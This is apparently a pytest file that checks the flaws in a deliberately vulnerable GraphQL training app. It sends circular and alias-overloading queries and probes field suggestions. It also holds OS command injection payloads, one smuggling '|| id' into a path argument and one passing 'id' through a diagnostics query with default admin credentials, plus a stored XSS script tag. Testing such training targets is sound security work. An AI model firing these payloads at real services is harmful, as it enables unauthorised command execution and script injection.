
from common import graph_query, GRAPHQL_URL

def test_circular_query_pastes_owners():
  query = """
    query {
       pastes {
          owner {
              pastes {
                  owner {
                      name
                  }
              }
          }
       }
    }
  """
  r = graph_query(GRAPHQL_URL, query)
  assert r.status_code == 200
  assert r.json()['data']['pastes'][0]['owner']['pastes'][0]['owner']['name'] == 'DVGAUser'

def test_aliases_overloading():
    query = """
        query {
            a1: pastes { id }
            a2: pastes { id }
            a3: pastes { id }
            a4: pastes { id }
            a5: pastes { id }
        }
    """
    r = graph_query(GRAPHQL_URL, query)
    assert r.status_code == 200
    assert len(r.json()['data'].keys()) == 5

def test_field_suggestions():
    query = """
        query {
            systemUpd
        }
    """
    r = graph_query(GRAPHQL_URL, query)
    assert r.status_code == 400
    assert 'Did you mean' in r.json()['errors'][0]['message']

def test_os_injection():
    query = """
        mutation {
            importPaste(host:"hostthatdoesnotexist.com", port:80, path:"/ || id", scheme:"http") {
                result
            }
        }
    """

    r = graph_query(GRAPHQL_URL, query)
    assert r.status_code == 200
    assert 'uid=' in r.json()['data']['importPaste']['result']

def test_os_injection_alt():
    query = """
        query {
            systemDiagnostics(username:"admin", password:"changeme", cmd:"id")
        }
    """

    r= graph_query(GRAPHQL_URL, query)
    assert r.status_code == 200
    assert 'uid=' in r.json()['data']['systemDiagnostics']

def test_xss():
    query = """
        mutation {
            createPaste(title:"<script>alert(1)</script>", content:"zzzz", public:true) {
                paste {
                    title
                }
            }
        }
    """

    r = graph_query(GRAPHQL_URL, query)
    assert r.status_code == 200
    assert r.json()['data']['createPaste']['paste']['title'] == '<script>alert(1)</script>'
